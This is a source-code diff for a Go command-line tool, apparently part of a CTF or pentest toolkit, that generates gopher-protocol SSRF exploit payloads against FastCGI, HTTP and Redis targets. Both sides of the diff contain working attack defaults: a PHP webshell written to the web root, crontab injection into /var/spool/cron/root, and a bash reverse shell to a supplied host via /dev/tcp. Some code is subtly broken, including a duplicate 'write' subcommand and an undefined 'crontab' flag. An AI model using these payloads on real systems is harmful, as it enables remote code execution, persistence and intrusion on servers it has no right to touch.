@@ -2,282 +2,363 @@ package gopher
 
 import (
 	"fmt"
+	"net"
 	"net/url"
+	"strings"
 
-	"github.com/spf13/cobra"
+	"github.com/go-playground/validator/v10"
+	"github.com/urfave/cli/v3"
 	"github.com/virzz/logger"
-	"github.com/virzz/virzz/common"
-	"github.com/virzz/virzz/utils"
 )
 
-// fastCGICmd
-var fastCGICmd = &cobra.Command{
-	Use:   "fcgi [addr]",
-	Short: "Gopher Exp FastCGI",
-	Args:  cobra.MinimumNArgs(1),
-	RunE: func(cmd *cobra.Command, args []string) error {
-		addr := args[0]
-		_, _, err := utils.ParseAddr(addr)
-		if err != nil {
-			return err
-		}
-		if filename == "" {
-			filename = "/usr/share/php/PEAR.php"
-		}
-		r, err := expFastCGI(addr, command, filename)
-		if err != nil {
-			return err
-		}
-		for i := 0; i < urlencode; i++ {
-			r = url.QueryEscape(r)
-		}
-		return common.Output(r)
-	},
-}
-
-// redisCmd
-var redisCmd = &cobra.Command{
-	Use:   "redis",
-	Short: "Gopher Exp Redis",
-}
-
-// redisWriteCmd
-var redisWriteCmd = &cobra.Command{
-	Use:   "write [addr]",
-	Short: "Gopher Exp Redis Write Any File",
-	Args:  cobra.MinimumNArgs(1),
-	RunE: func(cmd *cobra.Command, args []string) error {
-		addr := args[0]
-		_, _, err := utils.ParseAddr(addr)
-		if err != nil {
-			return err
-		}
-		if filename == "" {
-			filename = "virzz.txt"
-		}
-		if filePath == "" {
-			filePath = "/var/www/html/"
-		}
-		if content == "" {
-			content = "Hello world"
-		}
-		r, err := expRedisCmd(addr, filePath, filename, content)
-		if err != nil {
-			return err
-		}
-		return common.Output(r)
-	},
-}
-
-// redisWebshellCmd
-var redisWebshellCmd = &cobra.Command{
-	Use:   "webshell [addr]",
-	Short: "Gopher Exp Redis Write Webshell",
-	Args:  cobra.MinimumNArgs(1),
-	RunE: func(cmd *cobra.Command, args []string) error {
-		addr := args[0]
-		_, _, err := utils.ParseAddr(addr)
-		if err != nil {
-			return err
-		}
-		if filename == "" {
-			filename = "virzz.php"
-		}
-		if filePath == "" {
-			filePath = "/var/www/html/"
-		}
-		if content == "" {
-			content = "\r\n<?php system($_GET['cmd']);?>\r\n"
-		}
-		r, err := expRedisCmd(addr, filePath, filename, content)
-		if err != nil {
-			return err
-		}
-		return common.Output(r)
-	},
-}
-
-// redisReverseCmd
-var redisReverseCmd = &cobra.Command{
-	Use:   "revese [addr]",
-	Short: "Gopher Exp Redis Write Crontab Revese Shell",
-	Args:  cobra.MinimumNArgs(1),
-	RunE: func(cmd *cobra.Command, args []string) error {
-		addr := args[0]
-		_, _, err := utils.ParseAddr(addr)
-		if err != nil {
-			return err
-		}
-		if filename == "" {
-			filename = "root"
-		}
-		if filePath == "" {
-			filePath = "/var/spool/cron/"
-		}
-		if reverseAddr == "" {
-			return fmt.Errorf("must need Reverse Addr")
-		}
-		r, err := expRedisReverseShell(addr, filePath, filename, reverseAddr)
-		if err != nil {
-			return err
-		}
-		return common.Output(r)
-	},
-}
-
-// redisCrontabCmd
-var redisCrontabCmd = &cobra.Command{
-	Use:   "cron [addr]",
-	Short: "Gopher Exp Redis Write Crontab",
-	Args:  cobra.MinimumNArgs(1),
-	RunE: func(cmd *cobra.Command, args []string) error {
-		addr := args[0]
-		_, _, err := utils.ParseAddr(addr)
-		if err != nil {
-			return err
-		}
-		if filename == "" {
-			filename = "root"
-		}
-		if filePath == "" {
-			filePath = "/var/spool/cron/"
-		}
-		if content == "" {
-			content = "id > /var/www/html/virzz.txt"
-		}
-		r, err := expRedisCrontabFile(addr, filePath, filename, content)
-		if err != nil {
-			return err
-		}
-		return common.Output(r)
-	},
-}
-
-// httpPostCmd
-var httpPostCmd = &cobra.Command{
-	Use:   "post [url]",
-	Short: "Gopher Exp HTTP POST",
-	Args:  cobra.MinimumNArgs(1),
-	RunE: func(cmd *cobra.Command, args []string) error {
-		host, uri, err := utils.ParseURLToHostAndURI(args[0])
-		if err != nil {
-			return err
-		}
-		if len(datas) == 0 {
-			return cmd.Help()
-		}
-		r, err := expHTTPPost(host, uri, datas)
-		if err != nil {
-			return err
-		}
-		for i := 0; i < urlencode; i++ {
-			r = url.QueryEscape(r)
-		}
-		return common.Output(r)
-	},
-}
-
-// httpUploadCmd
-var httpUploadCmd = &cobra.Command{
-	Use:   "upload [url]",
-	Short: "Gopher Exp HTTP Upload",
-	Args:  cobra.MinimumNArgs(1),
-	RunE: func(cmd *cobra.Command, args []string) error {
-		host, uri, err := utils.ParseURLToHostAndURI(args[0])
-		if err != nil {
-			return err
-		}
-		if len(datas) == 0 {
-			logger.Error("Require data by -d a=1 / a=@file")
-			return cmd.Help()
-		}
-		r, err := expHTTPUpload(host, uri, datas)
-		if err != nil {
-			return err
-		}
-		for i := 0; i < urlencode; i++ {
-			r = url.QueryEscape(r)
-		}
-		return common.Output(r)
-	},
-}
-
-// listenCmd
-var listenCmd = &cobra.Command{
-	Use:   "listen [addr]",
-	Short: "Gopher Exp By Listen",
-	Args:  cobra.MinimumNArgs(1),
-	RunE: func(cmd *cobra.Command, args []string) error {
-		addr := args[0]
-		_, _, err := utils.ParseAddr(addr)
-		if err != nil {
-			return err
-		}
-		r, err := expGopher(addr, port, times, quit)
-		if err != nil {
-			return err
-		}
-		for i := 0; i < urlencode; i++ {
-			r = url.QueryEscape(r)
-		}
-		return common.Output(r)
-	},
-}
-
+// Global Options Flag
 var (
-	command   string
-	filename  string
-	urlencode int
+	urlencodeFlag = &cli.IntFlag{
+		Name:       "urlencode",
+		Aliases:    []string{"e"},
+		Value:      0,
+		Usage:      "Urlencode count",
+		Persistent: true,
+		Action: func(c *cli.Context, f int) error {
+			logger.Debug(f)
+			return nil
+		},
+	}
 
-	filePath    string
-	content     string
-	reverseAddr string
+	targetAddrFlag = &cli.StringFlag{
+		Name:     "target",
+		Aliases:  []string{"t"},
+		Usage:    "Target addr",
+		Required: true,
+		Action: func(c *cli.Context, target string) error {
+			return validator.New().Var(target, "tcp_addr|hostname_port|url")
+		},
+	}
 
-	datas map[string]string
+	targetURLFlag = &cli.StringFlag{
+		Name:     "target",
+		Aliases:  []string{"t"},
+		Usage:    "Target URL",
+		Required: true,
+		Action: func(c *cli.Context, target string) error {
+			return validator.New().Var(target, "url|ip")
+		},
+	}
 
-	port, times int
-	quit        bool
+	filenameFlag = &cli.StringFlag{
+		Name:       "filename",
+		Aliases:    []string{"f"},
+		Value:      "",
+		Usage:      "Filename",
+		Persistent: true,
+	}
+
+	filepathFlag = &cli.StringFlag{
+		Name:    "filepath",
+		Aliases: []string{"p"},
+		Value:   "",
+		Usage:   "Filepath",
+	}
+
+	contentFlag = &cli.StringFlag{
+		Name:    "content",
+		Aliases: []string{"c"},
+		Value:   "",
+		Usage:   "Content",
+	}
+
+	redisFlags = []cli.Flag{
+		targetAddrFlag,
+		filenameFlag,
+		filepathFlag,
+		contentFlag,
+	}
 )
 
-// GopherCmd -
-var GopherCmd = &cobra.Command{
-	Use:           "gopher",
-	Short:         "Generate Gopher Exp",
-	SilenceErrors: true,
-	SilenceUsage:  true,
-	RunE: func(cmd *cobra.Command, args []string) error {
-		return cmd.Help()
-	},
-}
-
-func init() {
-	GopherCmd.PersistentFlags().CountVarP(&urlencode, "urlencode", "e", "URL Encode (-e , -ee -eee)")
-	GopherCmd.PersistentFlags().StringVarP(&filename, "filename", "f", "", "Filename")
-
-	fastCGICmd.Flags().StringVarP(&command, "command", "c", "id", "Command")
-	// fastCGICmd.Flags().StringVarP(&filename, "filename", "f", "", "Delimiter")
-
-	// redisCmd.PersistentFlags().StringVarP(&filename, "filename", "f", "", "Filename")
-	redisCmd.PersistentFlags().StringVarP(&filePath, "filepath", "p", "", "Filepath")
-	redisCmd.PersistentFlags().StringVarP(&content, "content", "c", "", "Content")
-
-	redisReverseCmd.Flags().StringVarP(&reverseAddr, "reverse", "r", "", "Reverse Addr")
-
-	httpPostCmd.Flags().StringToStringVarP(&datas, "data", "d", datas, "Post data")
-	httpUploadCmd.Flags().StringToStringVarP(&datas, "data", "d", datas, "Post data/upload file")
-
-	listenCmd.Flags().IntVarP(&port, "port", "p", 9527, "Listen Port")
-	listenCmd.Flags().IntVarP(&times, "times", "t", 1, "Accept Times")
-	listenCmd.Flags().BoolVarP(&quit, "quit", "q", false, "Redis Quit")
-
-	redisCmd.AddCommand(redisWriteCmd, redisWebshellCmd, redisCrontabCmd, redisReverseCmd)
-
-	GopherCmd.AddCommand(fastCGICmd, redisCmd, httpPostCmd, httpUploadCmd, listenCmd)
-	GopherCmd.SuggestionsMinimumDistance = 1
-}
-
-func ExportCommand() []*cobra.Command {
-	return []*cobra.Command{
-		GopherCmd,
+func QueryEscape(r string, count int) string {
+	for i := 0; i < count; i++ {
+		r = url.QueryEscape(r)
 	}
+	return r
+}
+
+var Cmd = &cli.Command{
+	Category:        "Web",
+	Name:            "gopher",
+	Usage:           "Generate Gopher Exp",
+	Flags: []cli.Flag{
+		urlencodeFlag,
+	},
+	Commands: []*cli.Command{
+
+		// fastcgi
+		&cli.Command{
+			Category: "Other",
+			Name:     "fastcgi",
+			Aliases:  []string{"fcgi"},
+			Usage:    "FastCGI",
+			Flags: []cli.Flag{
+				targetAddrFlag,
+				filenameFlag,
+				&cli.StringFlag{
+					Name:    "command",
+					Aliases: []string{"c"},
+					Value:   "id",
+					Usage:   "Command",
+				},
+			},
+			Action: func(c *cli.Context) (err error) {
+				filename := c.String("filename")
+				if filename == "" {
+					filename = "/usr/share/php/PEAR.php"
+				}
+				r, err := GopherFastCGIExp(c.String("target"), c.String("command"), filename)
+				if err != nil {
+					return err
+				}
+				// urlencode
+				r = QueryEscape(r, c.Int("urlencode"))
+				_, err = fmt.Println(r)
+				return
+			},
+		},
+
+		// http post
+		&cli.Command{
+			Category: "HTTP",
+			Name:     "post",
+			Usage:    "HTTP Post",
+			Flags: []cli.Flag{
+				targetURLFlag,
+				&cli.StringMapFlag{
+					Name:     "data",
+					Aliases:  []string{"d"},
+					Usage:    "Post data. key=value",
+					Required: true,
+				},
+			},
+			Action: func(c *cli.Context) (err error) {
+				target := c.String("target")
+				if !strings.HasPrefix(target, "http") {
+					target = fmt.Sprintf("http://%s", target)
+				}
+				targetURL, err := url.Parse(target)
+				if err != nil {
+					return err
+				}
+				r, err := GopherHTTPPostExp(targetURL.Host, targetURL.RequestURI(), c.StringMap("data"))
+				if err != nil {
+					return err
+				}
+				r = QueryEscape(r, c.Int("urlencode"))
+				_, err = fmt.Println(r)
+				return
+			},
+		},
+
+		// http upload
+		&cli.Command{
+			Category: "HTTP",
+			Name:     "upload",
+			Usage:    "HTTP Upload",
+			Flags: []cli.Flag{
+				targetURLFlag,
+				&cli.StringMapFlag{
+					Name:     "data",
+					Aliases:  []string{"d"},
+					Usage:    "Post data/upload file. key=value or name=content",
+					Required: true,
+				},
+			},
+			Action: func(c *cli.Context) (err error) {
+				target := c.String("target")
+				if !strings.HasPrefix(target, "http") {
+					target = fmt.Sprintf("http://%s", target)
+				}
+				targetURL, err := url.Parse(target)
+				if err != nil {
+					return err
+				}
+				r, err := GopherHTTPUploadExp(targetURL.Host, targetURL.RequestURI(), c.StringMap("data"))
+				if err != nil {
+					return err
+				}
+				r = QueryEscape(r, c.Int("urlencode"))
+
+				_, err = fmt.Println(r)
+				return
+			},
+		},
+
+		// listen
+		&cli.Command{
+			Category: "Redis",
+			Name:     "listen",
+			Usage:    "By Listen redis-cli command",
+			Flags: []cli.Flag{
+				&cli.IntFlag{
+					Name:    "port",
+					Aliases: []string{"p"},
+					Value:   9527,
+					Usage:   "Listen Port",
+				},
+				&cli.IntFlag{
+					Name:    "times",
+					Aliases: []string{"t"},
+					Value:   1,
+					Usage:   "Number of accept times",
+				},
+				&cli.BoolFlag{
+					Name:    "no-quit",
+					Aliases: []string{"no"},
+					Value:   true,
+					Usage:   "Redis reply 'quit' at the end",
+				},
+			},
+			Action: func(c *cli.Context) (err error) {
+				if c.NArg() < 1 {
+					return fmt.Errorf("not found arg [addr]")
+				}
+				r, err := GenGopherExpByListen(c.String("target"), c.Int("port"), !c.Bool("no-quit"))
+				if err != nil {
+					return err
+				}
+				for i := 0; i < c.Int("urlencode"); i++ {
+					r = url.QueryEscape(r)
+				}
+				_, err = fmt.Println(r)
+				return
+			},
+		},
+
+		// Write
+		&cli.Command{
+			Category: "Redis",
+			Name:     "write",
+			Usage:    "Redis Write File",
+			Flags:    redisFlags,
+			Action: func(c *cli.Context) (err error) {
+				target := c.String("target")
+				filename := c.String("filename")
+				filepath := c.String("filepath")
+				content := c.String("content")
+				if filename == "" {
+					filename = "root"
+				}
+				if filepath == "" {
+					filepath = "/var/www/html/"
+				}
+				if content == "" {
+					content = "Gopher Exp Redis Write File"
+				}
+				r, err := GopherRedisWriteExp(target, filepath, filename, content)
+				if err != nil {
+					return err
+				}
+				r = QueryEscape(r, c.Int("urlencode"))
+				_, err = fmt.Println(r)
+				return
+			},
+		},
+
+		// Webshell
+		&cli.Command{
+			Category: "Redis",
+			Name:     "webshell",
+			Usage:    "Redis Write Webshell",
+			Flags:    redisFlags,
+			Action: func(c *cli.Context) (err error) {
+				target := c.String("target")
+				filename := c.String("filename")
+				filepath := c.String("filepath")
+				content := c.String("content")
+				if filename == "" {
+					filename = "virzz.php"
+				}
+				if filepath == "" {
+					filepath = "/var/www/html/"
+				}
+				if content == "" {
+					content = "\r\n<?php system($_GET['cmd']);?>\r\n"
+				}
+				r, err := GopherRedisWriteExp(target, filepath, filename, content)
+				if err != nil {
+					return err
+				}
+				r = QueryEscape(r, c.Int("urlencode"))
+				_, err = fmt.Println(r)
+				return
+			},
+		},
+
+		// Crontab
+		&cli.Command{
+			Category: "Redis",
+			Name:     "write",
+			Usage:    "Redis Write Crontab",
+			Flags:    redisFlags,
+			Action: func(c *cli.Context) (err error) {
+				target := c.String("target")
+				filename := c.String("filename")
+				filepath := c.String("filepath")
+				content := c.String("content")
+				if filename == "" {
+					filename = "root"
+				}
+				if filepath == "" {
+					filepath = "/var/spool/cron/"
+				}
+				if content == "" {
+					content = fmt.Sprintf("\n\n\n\n*/1 * * * * sh -c \"%s\"\n\n\n\n", c.String("crontab"))
+				}
+				r, err := GopherRedisWriteExp(target, filepath, filename, content)
+				if err != nil {
+					return err
+				}
+				r = QueryEscape(r, c.Int("urlencode"))
+				_, err = fmt.Println(r)
+				return
+			},
+		},
+
+		// Crontab Reverse
+		&cli.Command{
+			Category: "Redis",
+			Name:     "reverse",
+			Usage:    "Redis Write File",
+			Flags: []cli.Flag{
+				targetAddrFlag,
+				filenameFlag,
+				filepathFlag,
+				&cli.StringFlag{
+					Name:    "reverse",
+					Aliases: []string{"r"},
+					Usage:   "Write Crontab Reverse shell addr",
+					Action: func(c *cli.Context, target string) error {
+						return validator.New().Var(target, "tcp_addr")
+					},
+				},
+			},
+			Action: func(c *cli.Context) (err error) {
+				target := c.String("target")
+				filename := c.String("filename")
+				filepath := c.String("filepath")
+				if filename == "" {
+					filename = "root"
+				}
+				if filepath == "" {
+					filepath = "/var/spool/cron/"
+				}
+				addr, _ := net.ResolveTCPAddr("tcp", c.String("reverse"))
+				content := fmt.Sprintf("\n\n\n\n*/1 * * * * sh -c \"bash -i >& /dev/tcp/%s/%d 0>&1\"\n\n\n\n", addr.IP.String(), addr.Port)
+				r, err := GopherRedisWriteExp(target, filepath, filename, content)
+				if err != nil {
+					return err
+				}
+				r = QueryEscape(r, c.Int("urlencode"))
+				_, err = fmt.Println(r)
+				return
+			},
+		},
+	},
 }
